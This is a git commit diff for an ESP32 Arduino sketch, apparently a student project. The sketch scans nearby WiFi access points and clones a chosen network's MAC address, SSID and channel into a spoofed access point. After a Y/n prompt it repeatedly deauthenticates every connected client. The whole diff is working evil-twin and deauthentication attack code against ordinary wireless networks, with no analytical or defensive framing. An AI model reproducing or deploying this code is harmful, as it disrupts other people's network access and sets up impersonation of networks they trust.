ae1e0d240ce2c5b841a6612af0b89439a8185500
Muhammad Haffejee <m.haffejee@student.unsw.edu.au>
2024-11-03 00:25:07 +1100

    IT WORKSgit statusgit status

--- espPommeDeTerre/espPommeDeTerre.ino
+++ espPommeDeTerre/espPommeDeTerre.ino
@@ -7,6 +7,8 @@ enum State
     AP_SCAN,
     AP_SPOOF,
     DEAUTH,
+    ATTACK, 
+    END
 };
 
 enum State state = State::INIT;
@@ -16,10 +18,12 @@ struct AP_info
     String ssid;
     int channel;
     uint8_t mac[6];
+    wifi_auth_mode_t authmode;
 };
 
+
 AP_info spoof_info;
-AP_info original_info;
+
 bool menace{false};
 
 void AccessPointScan()
@@ -61,7 +65,7 @@ void AccessPointScan()
         return;
     }
     x--; // decriment to select
-    spoof_info = AP_info{WiFi.SSID(x), WiFi.channel(x)};
+    spoof_info = AP_info{WiFi.SSID(x), WiFi.channel(x), WiFi.encryptionType(x)};
     memcpy(spoof_info.mac, WiFi.BSSID(x), 6);
     state = State::AP_SPOOF;
     WiFi.scanDelete();
@@ -77,8 +81,8 @@ void SpoofMACaddress()
 
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
     esp_wifi_init(&cfg);
-    WiFi.mode(WIFI_MODE_AP);
-    delay(200);
+    esp_wifi_set_mode(WIFI_MODE_AP); delay(100);
+
     auto err = esp_wifi_set_mac(WIFI_IF_AP, spoof_info.mac);  // Change MAC
     switch (err) {
         case ESP_OK: Serial.println("Successful MAC Change"); break;
@@ -89,63 +93,85 @@ void SpoofMACaddress()
         case ESP_ERR_WIFI_MODE: Serial.println("WiFi mode is wrong"); break;
         default: Serial.println("Bad juju, consult esp err");
     }
+    
+    wifi_config_t apConfig = {};
+    strncpy((char *)apConfig.ap.ssid, spoof_info.ssid.c_str(), sizeof(apConfig.ap.ssid));
+    apConfig.ap.ssid_len = spoof_info.ssid.length();
+    apConfig.ap.channel = spoof_info.channel;
+    apConfig.ap.max_connection = 10; // Max clients
+    apConfig.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    if (spoof_info.authmode == WIFI_AUTH_WPA2_PSK || spoof_info.authmode == WIFI_AUTH_WPA_PSK)
+        strcpy((char *)apConfig.ap.password, "verysecurepassword");
 
+
+    esp_wifi_set_config(WIFI_IF_AP, &apConfig); delay(200);
     esp_wifi_start();
-    delay(200);
-    WiFi.softAP(spoof_info.ssid, "verysecurepassword", spoof_info.channel);
     Serial.printf("Started AP spoof with SSID: %s, Channel: %d\n", spoof_info.ssid.c_str(), spoof_info.channel);
-    delay(200);
     state = State::DEAUTH;
 }
 
-void DeauthAttack()
+void DeauthBegin()
 {
-    if (Serial.available() > 0)
+    Serial.println("Are you sure Y/n");
+    while (!Serial.available()) delay(100);
+    int rsp = Serial.read();
+    switch (rsp)
     {
-        String command = Serial.readString();
-        if (command == "Yippee")
-        {
-            // loop channels
-            menace = true; // deauth all
-        }
-        else if (command == "stop")
-        {
-            menace = false;
-        }
+    case 'Y':
+        Serial.println("ATTACKING...");
+        state = State::ATTACK;
+        break;
+    default:
+        Serial.println("Aborting...");
+        state = State::END;
     }
-    if (menace)
-    {
-        esp_wifi_deauth_sta(0); // deauth all
-    }
+
 }
+
+void DeauthAttack() {
+    if(Serial.available() > 0) {
+        String input = Serial.readString();
+        if ("stop" == input) {
+            state = State::END;
+        }
+    }
+    esp_wifi_deauth_sta(0);
+    delay(10);
+}
+
+bool end_program{false};
 
 void setup()
 {
     Serial.begin(115200);
-    Serial.flush();
     WiFi.mode(WIFI_MODE_STA); // Set ESP32 to Station mode
     WiFi.disconnect();        // Ensure we start clean
     delay(100);               // Short delay to stabilize 100
-    auto err = esp_wifi_get_mac(WIFI_IF_AP, spoof_info.mac);
+    auto err = esp_wifi_get_mac(WIFI_IF_STA, spoof_info.mac);
     if (err == ESP_OK)
-        Serial.printf("Successful MAC Change to %s",
-            WiFi.macAddress().c_str()
-        );
+        Serial.printf("MAC adress: %s", WiFi.macAddress().c_str());
     else Serial.println("No MAC for u");
+
     state = State::AP_SCAN;
 }
 
 void loop()
 {
-    switch (state)
-    {
-    case State::AP_SCAN:
-        AccessPointScan();
-        break;
-    case State::AP_SPOOF:
-        SpoofMACaddress();
-        break;
-    case State::DEAUTH: 
-        DeauthAttack();
+    switch (state) {
+        case State::AP_SCAN:
+            AccessPointScan();
+            break;
+        case State::AP_SPOOF:
+            SpoofMACaddress();
+            break;
+        case State::DEAUTH:
+            DeauthBegin();
+            break;
+        case State::ATTACK:
+            DeauthAttack();
+            break;
+        case State::END:
+            end_program = true;
     }
+    if (end_program) exit(0);
 }
